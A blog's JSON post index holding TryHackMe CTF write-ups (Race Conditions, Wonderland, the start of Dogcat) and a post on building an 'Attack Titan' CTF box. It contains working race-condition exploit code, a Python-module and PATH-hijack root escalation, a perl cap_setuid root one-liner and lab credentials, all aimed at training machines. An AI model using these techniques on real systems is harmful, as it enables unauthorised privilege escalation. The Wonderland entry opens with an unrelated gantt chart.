[
  
  {
    "title": "Race Conditions Challenge",
    "url": "/posts/race-condition/",
    "categories": "CTF Writeups, Try Hack Me",
    "tags": "C, Race Condition",
    "date": "2024-08-18 00:00:00 +0200",
    





    
    "snippet": "  Checkout Race Conditions room on TryHackMeIn this room, we are faced with three challenges; walk, run, and sprint.For each one, a vulnerable SUID binary is given, its source code, and a flagfile....",
    "content": "  Checkout Race Conditions room on TryHackMeIn this room, we are faced with three challenges; walk, run, and sprint.For each one, a vulnerable SUID binary is given, its source code, and a flagfile. Our objective is to exploit the binaries and read the content of the flags.A. Learn to walkThe vulnerable binary’s code:#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;assert.h&gt;#include &lt;sys/stat.h&gt;int main(int argc, char **argv, char **envp) {    int n;    char buf[1024];    struct stat lstat_buf;    if (argc != 2) {        puts(\"Usage: anti_flag_reader &lt;FILE&gt;\");        return 1;    }        puts(\"Checking if 'flag' is in the provided file path...\");    int path_check = strstr(argv[1], \"flag\");    puts(\"Checking if the file is a symlink...\");    lstat(argv[1], &amp;lstat_buf);    int symlink_check = (S_ISLNK(lstat_buf.st_mode));    puts(\"&lt;Press Enter to continue&gt;\");    getchar();        if (path_check || symlink_check) {        puts(\"Nice try, but I refuse to give you the flag!\");        return 1;    } else {        puts(\"This file can't possibly be the flag. I'll print it out for you:\\n\");        int fd = open(argv[1], 0);        assert(fd &gt;= 0 &amp;&amp; \"Failed to open the file\");        while((n = read(fd, buf, 1024)) &gt; 0 &amp;&amp; write(1, buf, n) &gt; 0);    }        return 0;}This program takes a path of a file and prints its content if it (the filepath)satisfies two conditions:  The path should not contain the substring “flag”  The path should not be a symbolic linkNoticed anything suspicious?? Well, why would the program require the user topress Enter to continue? This is where the vulnerability resides. The programactually performs the necessary checks on the path given by the user. However,wainting for the user inputs gives enough time to manipulate the benine pathand to point it to the desired flag.sequenceDiagram    participant C as anti_flag_reader    participant F as File    participant J as Attacker    C-&gt;&gt;F: Check security    Activate C    Note over C: wait for user input    J-&gt;&gt;F: Edit the file    J-&gt;&gt;C: User input    Deactivate C    C-&gt;&gt;F: Read fileWe first run the program and give some random filepath as argumentrace@car:/home/walk$ ./anti_flag_reader /home/race/some_fileChecking if 'flag' is in the provided file path...Checking if the file is a symlink... &lt;Press Enter to continue&gt;Now from another terminal, we create a symbolic link that points to the flag:race@car:/home/walk$ ln -s /home/walk/flag /home/race/some_fileBack to our program, we press Enter, and get the flagrace@car:/home/walk$ ./anti_flag_reader /home/race/some_fileChecking if 'flag' is in the provided file path...Checking if the file is a symlink... &lt;Press Enter to continue&gt;This file can't possibly be the flag. I'll print it out for you:THM{R4c3_c0nd1710n5_******}B. RunningThe vulnerable binary’s code:#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;assert.h&gt;int main(int argc, char **argv, char **envp) {    int fd;    int n;    int context;     char buf[1024];    if (argc != 2) {        puts(\"Usage: cat2 &lt;FILE&gt;\");        return 1;    }    puts(\"Welcome to cat2!\");    puts(\"This program is a side project I've been working on to be a more secure version of the popular cat command\");    puts(\"Unlike cat, the cat2 command performs additional checks on the user's security context\");    puts(\"This allows the command to be security compliant even if executed with SUID permissions!\\n\");    puts(\"Checking the user's security context...\");    context = check_security_contex(argv[1]);    puts(\"Context has been checked, proceeding!\\n\");    if (context == 0) {        puts(\"The user has access, outputting file...\\n\");        fd = open(argv[1], 0);        assert(fd &gt;= 0 &amp;&amp; \"Failed to open the file\");        while((n = read(fd, buf, 1024)) &gt; 0 &amp;&amp; write(1, buf, n) &gt; 0);    } else {        puts(\"[SECURITY BREACH] The user does not have access to this file!\");        puts(\"Terminating...\");        return 1;    }        return 0;}int check_security_contex(char *file_name) {    int context_result;    context_result = access(file_name, R_OK);    usleep(500);    return context_result;}Following the same logic as the previous challenge, it should be easy to spotthe weakness. Yes, it is the usleep call. This call makes the process sleepfor 500 microseconds. This is enough to play the same trick on the given pathand allow for disclosing the flag’s content.We can easily abuse the program’s logic by running the binary in the backgroundand execute a custom command afterwardsLet’s test it then:race@car:/home/run$ ./cat2 some_file &amp; (sleep 0.00001 &amp;&amp; echo VULNERABLE)[1] 1460Welcome to cat2!This program is a side project I've been working on to be a more secure version of the popular cat commandUnlike cat, the cat2 command performs additional checks on the user's security contextThis allows the command to be security compliant even if executed with SUID permissions!Checking the user's security context...VULNERABLEContext has been checked, proceeding![SECURITY BREACH] The user does not have access to this file!Terminating...[1]+  Exit 1                  ./cat2 ../race/fileNotice that “VULNERABLE” was printed right after the security check. Now wecan replace the echo with a useful command, like creating another symboliclink pointing to the flag:#!/bin/bashtouch /home/race/running/home/run/cat2 /home/race/running &amp;echo \"START\"; ln -f -s /home/run/flag /home/race/running; echo \"DONE\"rm /home/race/runningrace@car:/home/run$ /home/race/play_trick.sh STARTWelcome to cat2!This program is a side project I've been working on to be a more secure version of the popular cat commandUnlike cat, the cat2 command performs additional checks on the user's security contextThis allows the command to be security compliant even if executed with SUID permissions!Checking the user's security context...DONEContext has been checked, proceeding!The user has access, outputting file...THM{R4c1n6_f4573r_*****}C. Now sprintThe vulnerable binary’s code:#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/sendfile.h&gt;#include &lt;sys/stat.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;typedef struct {    int sock;    struct sockaddr address;    int addr_len;} connection_t;int money;void *run_thread(void *ptr) {    long addr;    char *buffer;    int buffer_len = 1024;    char balance[512];    int balance_length;    connection_t *conn;    if (!ptr) pthread_exit(0);    conn = (connection_t *)ptr;    addr = (long)((struct sockaddr_in *) &amp;conn-&gt;address)-&gt;sin_addr.s_addr;    buffer = malloc(buffer_len + 1);    buffer[buffer_len] = 0;        read(conn-&gt;sock, buffer, buffer_len);        if (strstr(buffer, \"deposit\")) {        money += 10000;    } else if (strstr(buffer, \"withdraw\")) {        money -= 10000;    } else if (strstr(buffer, \"purchase flag\")) {        if (money &gt;= 15000) {            sendfile(conn-&gt;sock, open(\"/home/sprint/flag\", O_RDONLY), 0, 128);            money -= 15000;        } else {            write(conn-&gt;sock, \"Sorry, you don't have enough money to purchase the flag\\n\", 56);        }    }    balance_length = snprintf(balance, 1024, \"Current balance: %d\\n\", money);    write(conn-&gt;sock, balance, balance_length);        usleep(1);    money = 0;        close(conn-&gt;sock);    free(buffer);    free(conn);        pthread_exit(0);}int main(int argc, char **argv) {    int sock = -1;    int port = 1337;    struct sockaddr_in address;    connection_t *connection;    pthread_t thread;    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &amp;(int){1}, sizeof(int));    address.sin_family = AF_INET;    address.sin_addr.s_addr = INADDR_ANY;    address.sin_port = htons(port);    if (bind(sock, (struct sockaddr *) &amp;address, sizeof(struct sockaddr_in)) &lt; 0) {        fprintf(stderr, \"Cannot bind to port %d\\n\", port);        return -1;    }        if (listen(sock, 32) &lt; 0) {        fprintf(stderr, \"Cannot listen on port %d\\n\", port);        return -1;    }    fprintf(stdout, \"Listening for connections on port %d...\\n\", port);    fprintf(stdout, \"Accepted commands: \\\"deposit\\\", \\\"withdraw\\\", \\\"purchase flag\\\"\\n\");    while (1) {        connection = (connection_t *) malloc(sizeof(connection_t));        connection-&gt;sock = accept(sock, &amp;connection-&gt;address, &amp;connection-&gt;addr_len);        if (connection-&gt;sock &lt;= 0) {            free(connection);        } else {            fprintf(stdout, \"Connection received! Creating a new handler thread...\\n\");            pthread_create(&amp;thread, 0, run_thread, (void *) connection);            pthread_detach(thread);        }    }        return 0;}In short, the program creatss a server socket on port 1337. For each receivedconnection, a thread is created, which will handle the user’s requests tomanipulate his “bank account”. If we want to get the flag, we need at least15000 credit. We cannot just deposit enough amount of money sequentiallybecause the money value is reset right before the thread is terminated.Thus, an exploitation of this program would be by creating as many connectionsas needed (2) to deposit enough money to get the flag, then one extra thread toretreive the flag before the money value go back to zero.Here is our code:#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;string.h&gt;#define SERVER_IP \"127.0.0.1\"#define SERVER_PORT 1337#define NUM_CONNECTIONS 3#define MONEY_THRESHOLD 15000void *deposit_money(void *arg) {    int sock;    struct sockaddr_in server;    char message[1024], server_reply[1024];    // Create socket    sock = socket(AF_INET, SOCK_STREAM, 0);    if (sock == -1) {        perror(\"could not create socket\");        pthread_exit(NULL);    }    server.sin_addr.s_addr = inet_addr(SERVER_IP);    server.sin_family = AF_INET;    server.sin_port = htons(SERVER_PORT);    // Connect to remote server    if (connect(sock, (struct sockaddr *)&amp;server, sizeof(server)) &lt; 0) {        perror(\"connect failed. error\");        close(sock);        pthread_exit(NULL);    }    // Send deposit command    strcpy(message, \"deposit\\n\");    if (send(sock, message, strlen(message), 0) &lt; 0) {        perror(\"deposit failed\");        close(sock);        pthread_exit(NULL);    }    // Receive a reply from the server    if (recv(sock, server_reply, 1024, 0) &lt; 0) {        perror(\"recv failed\");    }        printf(\"Server reply:\\n%s\", server_reply);    // Close the socket    close(sock);    pthread_exit(NULL);}void *get_flag(void *arg) {    int sock;    struct sockaddr_in server;    char message[1024], server_reply[1024];    // Create socket    sock = socket(AF_INET, SOCK_STREAM, 0);    if (sock == -1) {        perror(\"could not create socket\");        pthread_exit(NULL);    }    server.sin_addr.s_addr = inet_addr(SERVER_IP);    server.sin_family = AF_INET;    server.sin_port = htons(SERVER_PORT);    // Connect to remote server    if (connect(sock, (struct sockaddr *)&amp;server, sizeof(server)) &lt; 0) {        perror(\"connect failed. error\");        close(sock);        pthread_exit(NULL);    }    // Send purchase flag command    strcpy(message, \"purchase flag\\n\");    if (send(sock, message, strlen(message), 0) &lt; 0) {        perror(\"failed to get flag\");        close(sock);        pthread_exit(NULL);    }    // Receive a reply from the server    if (recv(sock, server_reply, 1024, 0) &lt; 0) {        perror(\"recv failed\");    }        printf(\"Server reply:\\n%s\", server_reply);    // Close the socket    close(sock);    pthread_exit(NULL);}int main(int argc, char **argv) {    pthread_t threads[NUM_CONNECTIONS];    for (int i = 0; i &lt; NUM_CONNECTIONS - 1; i++) {        pthread_create(&amp;threads[i], NULL, deposit_money, NULL);    }    pthread_create(&amp;threads[NUM_CONNECTIONS-1], NULL, get_flag, NULL);    return 0;}With some luck we get the flag:race@car:~$ ./abs Server reply:Current balance: 10000Server reply:Current balance: 20000Server reply:THM{R4c1n6_f0r_7h47_5w337_******}Current balance: -15000  The scripts and commands here may not work at the first try. That is dueto the processor having more work to take care of, and thus, not executingthe threads the way we expect in an ideal scenario. Keep trying till it works."
  },
  
  {
    "title": "Wonderland",
    "url": "/posts/wonderland/",
    "categories": "CTF Writeups, Try Hack Me, Wonderland",
    "tags": "ffuf, Linux Privesc",
    "date": "2024-07-22 00:00:00 +0200",
    





    
    "snippet": "gantt    dateFormat  YYYY-MM-DD    excludes    weekends    section Provisoire    Cadrage : 2024-04-08, 2024-05-20    KNW1 : 2024-05-20, 2024-07-01    KNW2 : 2024-07-01, 2024-08-15    KNW3 : 2024-08...",
    "content": "gantt    dateFormat  YYYY-MM-DD    excludes    weekends    section Provisoire    Cadrage : 2024-04-08, 2024-05-20    KNW1 : 2024-05-20, 2024-07-01    KNW2 : 2024-07-01, 2024-08-15    KNW3 : 2024-08-15, 2024-09-30    section Effectif    Cadrage :done, 2024-04-08, 2024-05-20    KNW1 :done, 2024-05-20, 2024-06-17    KNW2 :done, 2024-06-17, 2024-07-12    KNW3 :done, 2024-07-12, 2024-08-01    Auto :done, 2024-08-01, 2024-08-14    LLM :active, 2024-08-14, 2024-09-30    section A section    Completed task            :done,    des1, 2014-01-06,2014-01-08    Active task               :active,  des2, 2014-01-09, 3d    Future task               :         des3, after des2, 5d    Future task2              :         des4, after des3, 5d    section Critical tasks    Completed task in the critical line :crit, done, 2014-01-06,24h    Implement parser and jison          :crit, done, after des1, 2d    Create tests for parser             :crit, active, 3d    Future task in critical line        :crit, 5d    Create tests for renderer           :2d    Add to mermaid                      :until isadded    Functionality added                 :milestone, isadded, 2014-01-25, 0d    section Documentation    Describe gantt syntax               :active, a1, after des1, 3d    Add gantt diagram to demo page      :after a1  , 20h    Add another diagram to demo page    :doc1, after a1  , 48h    section Last section    Describe gantt syntax               :after doc1, 3d    Add gantt diagram to demo page      :20h    Add another diagram to demo page    :48h  Checkout Wonderland room at TryHackMeA. The Web ApplicationNmap ports scan:$ nmap -sC &lt;target_ip&gt; -Pn -n --disable-arp-ping -sV...SNIP...Nmap scan report for &lt;target_ip&gt;Host is up (0.00036s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (EdDSA)80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|_http-title: Follow the white rabbit.MAC Address: 02:75:95:58:69:BB (Unknown)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTwo services are available on the target machine; ssh and http. Navigating to the webserver, we find the following pageEnumerating for web content we discover an r directory. Inside of whichwe discover an a. By intuition, based on the context of the box, we canassume its leading to rabbit, which is the case.$ ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -u http://&lt;target_ip&gt;/FUZZ...SNIP...img                     [Status: 301, Size: 0, Words: 1, Lines: 1]index.html              [Status: 301, Size: 0, Words: 1, Lines: 1]r                       [Status: 301, Size: 0, Words: 1, Lines: 1]$ ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -u http://&lt;target_ip&gt;/r/FUZZ...SNIP...a                       [Status: 301, Size: 0, Words: 1, Lines: 1]index.html              [Status: 301, Size: 0, Words: 1, Lines: 1]This page looks fine and normal. However on inspection, we are able to find the credentials ofAlice hidden within the code.    &lt;!-- ...SNIP... --&gt;    &lt;p style=\"display: none;\"&gt;alice:HowDothTheLittleCrocodileImproveHisShiningTail&lt;/p&gt;    &lt;!-- ...SNIP... --&gt;B. Privilege Escalation1. Catching rabbitWe connect to Alice’s account on the target machine. Once there, we find two interesting files inher home directoryalice@wonderland:~$ ll...SNIP...-rw------- 1 root  root    66 May 25  2020 root.txt-rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.pyroot.txt is interesting because it is the root flag. walrus_and_the_carpenter.py on the otherhand is interesting because it can be executed with the user rabbit privileges :alice@wonderland:~$ sudo -l ...SNIP...User alice may run the following commands on wonderland:    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.pyThis python script does not do anything valuable in particular aside from importing the random module and printing some random verses to the screen. Well, this can be exploited via the importfunctionnality of python 1 ;  Python looks for modules in 3 steps:-      First, it searches in the current directory.    If not found then it searches in the directories which are in shell variable PYTHONPATH    If that also fails python checks the installation-dependent list of directories configured at the time Python is installed  As a result, we can supply owr own random module to the script. In the latter, we only need toprovide an implementation of the choice function as it is the only one being called. The providedimplementation will spawn a full TTY shell with rabbit privileges :#!/usr/bin python3import ptydef choice(variable):    pty.spawn(\"/bin/bash\")Now we caught the rabbitalice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.pyrabbit@wonderland:~$2. Hatter madnessIn the rabbit home directory we find a SUID binary of root:rabbit@wonderland:/home/rabbit$ ll...SNIP...-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty*We need to understand how this binary word, what calls it makes … etc, so that we can exploit iteffectively. If we execute it, a message will be shown, an input is requested, and finally, whateverthe input may be, a segmentation fault message will be displayed. This is not very usefull.We can try to reverse engineer the binary using a tool of choice, Ghidra for example. Here we are usingan online tool 2 for simplicity. The main funciton is decompiled as follows:// ...SNIP..void main(void){  setuid(0x3eb);  setgid(0x3eb);  puts(\"Welcome to the tea party!\\nThe Mad Hatter will be here soon.\");  system(\"/bin/echo -n \\'Probably by \\' &amp;&amp; date --date=\\'next hour\\' -R\");  puts(\"Ask very nicely, and I will give you some tea while you wait for him\");  getchar();  puts(\"Segmentation fault (core dumped)\");  return;}// ...SNIP...The segmentation fault is just a regular message printed in all situation afer reading the user input.This does not mean an actual segmentation fault did happen. Most importantly, the binary calls the dateprogram at /usr/bin/date. To exploite this, we can use a similar approach to what we did earlier withthe python script; During execution of shell scripts, the programs being called are fetched in thedirectories specified by the PATH variable, in the order of declaration. We add a path where write permissionsare granted to rabbit and add in there our own date program.In our case:echo $PATH      # out: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/binPATH=\"/home/rabbit:$PATH\"echo $PATH      # out: /home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin#!/bin/bashbash3. Wonderland’s RootOnce in the hatter home directory, we find a file containing the password of this account.WhyIsARavenLikeAWritingDesk?Enumerating privesc vectors to other accounts, we find out a special capability given to the binary/usr/bin/perl. Linux capabilities 3 allow assigning privileges to processes in granular way.In this situation the binary can be used to get a root shell:hatter@wonderland:~$ getcap -r / 2&gt;/dev/null/usr/bin/perl5.26.1 = cap_setuid+ep/usr/bin/mtr-packet = cap_net_raw+ep/usr/bin/perl = cap_setuid+ephatter@wonderland:~$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'root@wonderland:~# The root of the wonderland is now under control. The user flag is at /root/user.txt and the rootflag is, as we saw earlier, at /home/alice/root.txt. Overall, this was a very good room to practicesome basic privesc skills.C. Footnotes            Where Does Python Look for Modules? &#8617;&#xfe0e;              Decompiler Explorer &#8617;&#xfe0e;              Introduction to Linux capabilities &#8617;&#xfe0e;      "
  },
  
  {
    "title": "The Attack Titan",
    "url": "/projects/attack-titan/",
    "categories": "Projects, CTF",
    "tags": "PrivEsc, LFI, SQLi, AWS",
    "date": "2024-07-10 00:00:00 +0200",
    





    
    "snippet": "In this project, we’ll be creating a CTF box inspired by theworld of “The Attack Titan”. Obviously, the content may contain spoilers fromthe show. In a moment, we’ll delve into web application pent...",
    "content": "In this project, we’ll be creating a CTF box inspired by theworld of “The Attack Titan”. Obviously, the content may contain spoilers fromthe show. In a moment, we’ll delve into web application pentesting andprivilege escalation techniques. Each section will outline the specificskills and knowledge we’re targeting.  This box is designed to remain beginner-friendly.  If you want to give this CTF a try before reading this, you can cloneSNK1 repository from GitHub to your virtual machine, then runmachine/setup.sh script. Happy hacking!A. The web appThe web app is designed to be the initial point of assessment for players.The objective of hacking the web app is to obtain the credentials of auser on the machine. Achieving this will allow players to practice thefollowing skills:  Basic enumeration and source code inspection  Hash cracking  SQL injection  Local File Inclusion / source code disclosureExplorationPlayers typically begin by exploring the web app manually or by fuzzingfor hidden content, which is exactly what we anticipate. The /robots.txtfile usually contains information about content that should not be indexed,and it can sometimes reveal interesting details.In our case, the /robots.txt file only contains a hintpointing to the /titans.txt file. The /titans.txtfile provides some facts about titans and includes a clue leading to adirectory called /shiganshina.. and.. it all started fromShiganshina.# No robots.. only titans# ...# walls of /shiganshina are destroyed by a colossal titan that appears out of thin air. As the smaller titans flood# ...Navigating to /shiganshina, players will find three portalsrepresenting the three military groups, each maintained by its respectivefaction. After exploring and inspecting the source code of these pages,they will uncover a path to a hidden file located at /0ff1c3rs_leak.zip.According to the comments, this zip file contains credentials from a recentpolice breach. Players will need to leverage the fact that some passwordsmay not have been changed yet. However, the zip file is password-protectedand must be brute-forced using tools like John the Ripper and therockyou.txt wordlist. Spoiler: The password is “Titans curse”.As seen in season 3, the military police are closely monitoring the scouts’progress in their quest to understand and combat the titans. Once playersgain access to a police member’s account, they can exploit two vulnerabilitiesin the app to access a hidden database table containing information aboutthe scouts. The ultimate goal is to obtain Armin’s SSH credentials.Local File InclusionThe valid credentials for accessing the system belong to Hitch. Playersmight notice that the URL for the home page includes a page queryparameter. This observation should prompt them to test for a fileinclusion vulnerability.In this scenario, the attacker can exploit a PHP filter to read the sourcecode of shiganshina/police/index.php. This file will revealthe presence of another file on the server, db_connection.php,which is used to establish a connection to the database server. Due to poordevelopment practices, the database credentials are hardcoded into this PHPfile.With these credentials, the attacker can connect to the database and accessall hosted data, including Armin’s SSH credentials.SQL InjectionIf the previous vulnerability went unnoticed, there is an additional oneon the members page. The search field is vulnerable to SQL injection,which can be detected by appending a single quote ' to the end of thequery. This particular SQL injection is boolean-based, meaning a customerror message is displayed if the query is invalid.Once the vulnerability is identified, the attacker can use it to enumeratethe database’s tables. By exploring the database, they will eventuallyfind Armin’s credentials.A foot hold into the machineHere we go, the player now have access to Armin’s credentials, but thepassword is hashed and should be cracked first. The process includes theidentification of the hash and the choice of a suitable wordlist to launchthe attack.  Many tools can be used to identify the hash algorithm, e.g. hashid.  The password, once again, is present in the rockyou wordlist.a.arlert:a858ac15923bcf64ce5b50d3d3c341385c51e4e0fc58f0579db2a1d9f77237bd5e1136f8a12241403f04857127ddd76b3535fb7d381ab32fe4e118d5149fad3e  Crack common passwords’ hashes online with Crackstation2B. Privilege EscalationIn this section, the player will practice escalation techniques related to:  SUID binary with PATH manipulation  Misconfigured Network File ShareOverviewThe machine hosts accounts for several members of the Survey Corps,including Armin’s, Hanji’s, and Erwin’s. The other accounts are intendedto serve as distractions. Therefore, the ultimate goal of this section isto gain access to Erwin’s account.The relevant part of the filesystem hierarchy will be as follows:/home/  |__ a.arlert                  # foothold  |__ m.zacharias               # distraction  |__ h.zoe  |     |__ titans        \t    # SUID binary   |     |__ scouts_share\t\t# NFS  |__ e.smith      |__ plan.txt              # target      |__ plan.jpgRegarding permissions:      Home Folders: By default, users will not have access to other users’ home folders. The exception is Hanji’s home directory, which is accessible to everyone. This allows users to specifically access the titans binary.        Scouts Share Directory: The directory /home/h.zoe/scouts_share will be restricted and accessible only to Hanji, the owner.  From Armin To HanjiHanji’s home directory contains a SUID binary named titans.Normally, this binary is used to access information about all titans.However, the titans binary makes a call to another binarycalled titan, which does not exist on the system.Here is the decompiled titans binary:#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main(){    setuid(0);    setgid(0);    printf(\"SC :: Titans database\\n\");        char *titans[3] = {\"eren\", \"armored\", \"colossal\"};        for (int i = 0; i &lt; 3; i++) {        printf(\"retreiving information of %s ... \\n\", titans[i]);        char buffer[100];        snprintf(buffer, sizeof(buffer), \"titan %s\\n\", titans[i]);        system(buffer);    }    return 0;}Once the attacker observes that the titans binary calls a non-existenttitan binary, the next step is to create a program with the same name,titan, and place it in a writable directory listed in the PATH variable,or add a new writable directory to the PATH.For instance, here’s an example of how the attacker can escalate toHanji’s privileges:PATH=\"/home/a.arlert/:$PATH\"cp /bin/bash /home/a.arlert/titan/home/h.zoe/titans  # -&gt; h.zoe@paradis:~$From Hanji To ErwinEscalating from Hanji’s account to Erwin’s account, or even to the rootaccount, can be achieved by exploiting the NFS share in Hanji’s homedirectory. This NFS share is configured with the no_root_squash option.Thus, by mounting the NFS share on their local machine, an attacker canplace a SUID binary —owned by root— onto the share. When this binary isexecuted, it runs with root privileges, granting the attacker elevated access.  The no_root_squash option in NFS is used to controlhow root access is handled on the client side. When no_root_squash isenabled, the root user on the client machine retains root privileges onthe NFS server. This means that the root user can read, write, and modifyfiles on the NFS share as the root userC. AWS Deployment AutomationTo automate the creation of an EC2 instance along with all necessaryconfigurations such as users, services, and more, we can use AWSCloudFormation3.  Amazon Elastic Compute Cloud (EC2) is a part of Amazon.com’s cloud-computingplatform, Amazon Web Services (AWS), that allows users to rent virtualcomputers on which to run their own computer applications.  AWS CloudFormation is a service provided by Amazon Web Services (AWS)that enables users to model and manage infrastructure resources in anautomated and secure manner. Using CloudFormation, developers can defineand provision AWS infrastructure resources using a JSON- or YAML-formatted infrastructure as code template.The GitHub repository SNK1 contains the essential files forsetting up and configuring the machine for this CTF environment.Configuration steps are consolidated in the /machine/setup.shscript, which automates the environment setup. Additionally, the/aws-cloudformation.yaml file provides the CloudFormationspecification for defining and deploying the necessary AWS infrastructure.SetupThe setup script is quite straightforward and follows these steps to ensureeverything is configured correctly:  Create the users  Populate the home repositories with the content from SNK  Setup passwords  Configure permissions          All folders are accessible only to the respective owner      Hanji’s folder is accessible to everyone      Hanji’s NFS folder is only accessible to her      Assignment of SUID bit to /home/h.zoe/titans        Allow SSH connection with password for Armin  Setup and enable NFS with no_root_squash  Install docker and start the web servicesCloudFormation specAs mentioned earlier, the CloudFormation specification file is used todescribe the EC2 instance specifications that will be spawned. It alsoincludes instructions to execute the setup script, which configures users,permissions, and services according to the CTF environment described inthe previous sections.The file begins with the “Parameters” section, which allows us to defineparameters that can be used throughout the template. This section alsomakes it possible to specify or modify these parameters during thecreation of a CloudFormation stack, providing flexibility in customizingthe instance configuration.  A stack is a collection of AWS resources that you can manageas a single unit. In other words, you can create, update, or delete acollection of resources by creating, updating, or deleting stacks.For instance, we declare the SSH key pair for root access, the Github repofrom which to pull resources, and the type of EC2 instance to create.In the “Resources” section, we define the resources to be created for ourstack. This includes specifying the EC2 instance (referred to as SNK) thatwill host the CTF environment, along with a security group to permit SSHand HTTP connections. Additionally, we outline several bash commands toexecute after the instance starts, which will clone the SNK repository andrun the setup script.Finally, the “Outputs” section is used to define data to be exported to the CloudFormation dashboard. For our setup, we export the public IP address and EC2 instance ID of the created machine.Once the configuration is complete, you can proceed to the AWS ManagementConsole and search for CloudFormation to deploy the stack.searching for CloudFormation in AWS consoleIn the CloudFormation dashboard, we create a new stack and upload our specfilecreate stack from CloudFormation dashboardpreparing the templateHere, we can see that our parameters have been detected, giving us theoption to either edit them as needed or proceed with the default values.edit the parameters if necessaryWe can skip the next configurations, as they are not immediately relevant.Once the stack is created, it will take a few seconds to allocate theresources. Eventually, the machine will be ready, and we can access itusing the IP address provided in the Outputs tab.resources up and runningLast wordIn conclusion, this project demonstrates the creation and configuration ofa CTF environment inspired by the “The Attack Titan” TV show. From webapplication assessment to privilege escalation, this project offered me anopportunity to learn and revisit many concepts, and it provides you with achance to practice your skills and have some fun.In the next project, we’ll build upon this setup and implement a SIEMsystem to monitor and analyze user behavior when interacting with themachine.Till then… Shinzou wo sasageyo!External Links            SNK at GitHub &#8617;&#xfe0e; &#8617;&#xfe0e;2              Crackstation &#8617;&#xfe0e;              What is AWS CloudFormation &#8617;&#xfe0e;      "
  },
  
  {
    "title": "Dogcat",
    "url": "/posts/dogcat/",
    "categories": "CTF Writeups, Try Hack Me",
    "tags": "LFI, Docker",
    "date": "2024-03-20 00:00:00 +0100",
    





    
    "snippet": "  I made this website for viewing cat and dog images with PHP. If you’re feeling down, come look at some dogs/cats!This machine may take a few minutes to fully start up.Link to the roomLet’s start ...",
    "content": "  I made this website for viewing cat and dog images with PHP. If you’re feeling down, come look at some dogs/cats!This machine may take a few minutes to fully start up.Link to the roomLet’s start with a version and script scan against the target machine$ sudo nmap -sV -sC &lt;machine_ip&gt; -Pn -n --disable-arp-ping&lt;...snip...&gt;PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)80/tcp open  http    Apache httpd 2.4.38 ((Debian))|_http-title: dogcat|_http-server-header: Apache/2.4.38 (Debian)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelHome page of the web serverThe web app is about images of cats and dogs, no surprise. Let’s fuzz for hidden content.$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u \"http://&lt;machine_ip&gt;/FUZZ\"&lt;...snip...&gt;cats                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 160ms]dogs                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 99ms]We assume that these folders contain the content of the web app (images of cats and dogs).But we don’t have permission to access them.Let’s try making use of the first flag’s hint:  There’s more to view than just cats and dogs…Notice that view is the name of the query argument when calling the api for a random cat/dog image.We can try and fuzz to discover more values that are accepted by that argument:ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u \"http://&lt;machine_ip&gt;/?view=FUZZ\" -fs 455&lt;...snip...&gt;category                [Status: 200, Size: 759, Words: 106, Lines: 24, Duration: 39ms]&lt;...snip...&gt;The command returns many entries. Note that -fs 455 is used to exclude entries that return the standard response of “Sorry, only dogs or cats are allowed”.Navigating to http://&lt;machine_ip&gt;/?view=catalog, we get the following:Alright, now we know that the value of view is attached to “.php” extension and then passed to the include function.Since this is the case, we can use a php filter to disclose the source code of php files in the server. But first, let’s see what php files do we have there:$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt:FUZZ -u \"http://&lt;machine_ip&gt;/FUZZ\" -e .php&lt;...snip...&gt;flag.php                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 43ms]&lt;...snip...&gt;Interestingly, we found a flag file. Now we can use the read filter to get its content encoded in base64.When testing the payload, I was getting the “Sorry, only dogs or cats are allowed” error, so I tried many assumptions on how the app verifies these conditions.One of them, which later 